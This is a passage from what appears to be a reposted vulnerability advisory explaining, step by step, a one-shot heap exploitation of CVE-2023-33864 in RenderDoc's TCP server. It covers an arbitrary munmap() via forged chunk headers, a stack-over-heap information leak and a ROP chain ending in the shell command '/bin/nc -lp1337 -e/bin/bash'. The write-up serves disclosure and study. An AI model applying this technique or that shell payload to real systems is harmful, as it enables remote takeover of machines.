- C is a small chunk (a "callstack" from our handshake packet) whose
  exact size and contents do not matter much.

4/ We overflow the intermediary buffer I (thanks to CVE-2023-33864),
overwrite L's malloc_chunk header with an unchanged size field, and
overwrite C's malloc_chunk header with arbitrary prev_size and size
fields.

5/ The server free()s the intermediary buffer I. This free() succeeds
despite our buffer overflow because we overwrote the malloc_chunk header
of I's next chunk (L) with an unchanged size; without L between I and C,
free()'s security checks would detect that we overwrote C's malloc_chunk
header with arbitrary sizes and would abort().

6/ The server free()s the small chunk C. Because we overwrote C's
malloc_chunk header with a size field whose IS_MMAPPED bit is set,
free() calls its internal function munmap_chunk():

------------------------------------------------------------------------
3018 static void
3019 munmap_chunk (mchunkptr p)
3020 {
3021   size_t pagesize = GLRO (dl_pagesize);
3022   INTERNAL_SIZE_T size = chunksize (p);
....
3026   uintptr_t mem = (uintptr_t) chunk2mem (p);
3027   uintptr_t block = (uintptr_t) p - prev_size (p);
3028   size_t total_size = prev_size (p) + size;
....
3034   if (__glibc_unlikely ((block | total_size) &amp; (pagesize - 1)) != 0
3035       || __glibc_unlikely (!powerof2 (mem &amp; (pagesize - 1))))
3036     malloc_printerr ("munmap_chunk(): invalid pointer");
....
3044   __munmap ((char *) block, total_size);
3045 }
------------------------------------------------------------------------

- we fully control prev_size and size (because p is a pointer to C's
  malloc_chunk header, which we overwrote), so we can munmap() an
  arbitrary block of memory (at line 3044), relative to p (i.e.,
  relative to C, and without knowing the ASLR);

- we can easily satisfy the preconditions at lines 3034 and 3035,
  because we fully control prev_size and size, and because we know the
  sizes of F and I, and we precisely control the size of L.

We exploit this arbitrary munmap() to punch a hole of exactly 8MB+4KB
(the size of a thread stack and its guard page) in the middle of the
server's heap:

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....               |  punched hole  |
--|-+-+-+-+----------------------------------+----------------+-----------

Note: we cannot reuse the technique that we developed to exploit
CVE-2005-1513 (in qmail) here, because of the random gap between the
server's heap and the libraries (and our exploit here must be one-shot);
for reference:

  https://www.qualys.com/2020/05/19/cve-2005-1513/remote-code-execution-qmail.txt
  https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation
  https://www.ambionics.io/blog/hacking-watchguard-firewalls

7/ We connect to the server on TCP port 38920; the server creates a new
client thread, and allocates a new stack for this thread, exactly into
the hole that we punched in the server's heap (since step 2/ such a
stack cannot be allocated anymore into the random gap between the
server's heap and the libraries):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|               ....               |  client stack  |
--|-+-+-+-+----------------------------------+----------------+-----------

We then disconnect from the server; the client thread terminates cleanly
and the server pthread_join()s with it, thus making its stack available
for a future client thread.

8/ We establish a long-lived connection to the server, and send a 14MB
client-name string (but we do not trigger CVE-2023-33864 this time); the
server reads our client name into a malloc()ated string buffer that ends
in the middle of the unused client stack (i.e., this client name and the
client stack overlap in the server's heap):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|        ....        |             |  client stack  |
--|-+-+-+-+--------------------+-------------+-------------+--+-----------
                               |---------------------------|
                                        client name

Note: although the client stack's guard page is initially mmap()ed
PROT_NONE, it is conveniently mprotect()ed read-write by the glibc's
malloc when extending the server's heap for our 14MB client name (in
grow_heap())!

The server then creates a new client thread for our long-lived
connection, and reuses the existing client stack for this thread, thus
overwriting the end of our client name with data from the client stack.

9/ We establish another connection to the server; however, because our
first connection is still alive, the server disconnects us, but first
gives us the name of the client that is already connected (i.e., the
server sends us back our 14MB client name, which was partly overwritten
by data from the client stack), thus information-leaking all sorts of
stack contents to us: heap addresses, library addresses, stack
addresses, the stack canary, etc.

10/ While our first connection to the server is still alive, we
establish another connection and start sending a 9MB string; the server
reads this string into a malloc()ated buffer that starts in the middle
of the client stack (immediately after the 14MB client name), thus
overwriting the client stack with data that we fully control (a ROP
chain):

  0                           14M  16M      20M              28M      32M
--V-+-+-+-+--------------------V----V--------V----------------V--------V--
  |F|I|L|C|        ....        |             |  client stack  |
--|-+-+-+-+--------------------+-------------+-------------+--+-----------
                               |---------------------------|---&gt;
                                        client name         ROP

As soon as the client thread returns to a saved instruction pointer
(RIP) from the overwritten part of the client stack, our ROP chain is
executed: first a "ROP sled" (a series of minimal "ret" gadgets, because
we do not know the exact distance between the start of our ROP chain and
the first overwritten saved RIP in the client stack), followed by a
simple execve() of "/bin/nc -lp1337 -e/bin/bash".

Note: we build our ROP chain with gadgets from librenderdoc.so only
(whose address was information-leaked to us in step 9/), to avoid any
dependence on the application being debugged or its shared libraries.

To summarize this reliable, one-shot technique that we used to exploit
the heap-based buffer overflow in librenderdoc.so's multi-threaded TCP
server:

- we overwrite the malloc_chunk header of a heap-based buffer (which
  will be free()d) with an arbitrary size field whose IS_MMAPPED bit is
  set, and therefore transform this buffer overflow into an arbitrary
  munmap() call (thanks to free()'s munmap_chunk() function);

- with this arbitrary munmap() call, we punch a hole of exactly 8MB+4KB
  (the size of a thread stack) in the middle of the server's heap;

- we arrange for a thread stack to be mmap()ed into this hole, and for a
  string (which will later be sent to us by the server) to be
  malloc()ated over the lower part of this thread stack;

- when this string is sent to us by the server, parts of it were
  overwritten by data from the thread stack, thus information-leaking
  all sorts of stack contents to us (heap addresses, library addresses,
  stack addresses, the stack canary, etc);

- finally, we arrange for another string (which we fully control) to be
  malloc()ated over the higher part of the thread stack, and therefore
  overwrite a saved instruction pointer (in the thread stack) with a ROP
  chain of gadgets from librenderdoc.so (whose address was previously
  information-leaked to us) -- a classic "stack smashing" attack.

Note: further possibilities for munmap_chunk() exploitation are explored
in http://tukan.farm/2016/07/27/munmap-madness/.

</code></pre></div></div>

    </div>
</article>

                
                <footer class="footer">
        <section class="footer__about">
                <p class="footer__about__copyright">© qts588 2025</p>
                
                <span class="divider">·</span>
                
                <span class="footer__about__theme"><p>theme</p><a id="simplex-logo" href="https://github.com/andreondra/jekyll-theme-simplex" target="_blank"><img alt="Simplex theme logo" src="http://localhost:4000/assets/img/icons/simplex_logo.svg"/></a><p>by <a href="https://ondrej.golasowski.com/">golas</a></p></span>
        </section>
</footer>

                <script src="http://localhost:4000/assets/js/jquery.slim.min.js"></script>
<script src="http://localhost:4000/assets/js/lity.min.js"></script>
<script src="http://localhost:4000/assets/js/tools.js"></script>
<script src="http://localhost:4000/assets/js/pic.js"></script>
<script src="http://localhost:4000/assets/js/toc-highlight.js"></script>
            </main>
        </div>
    
</body>
</html>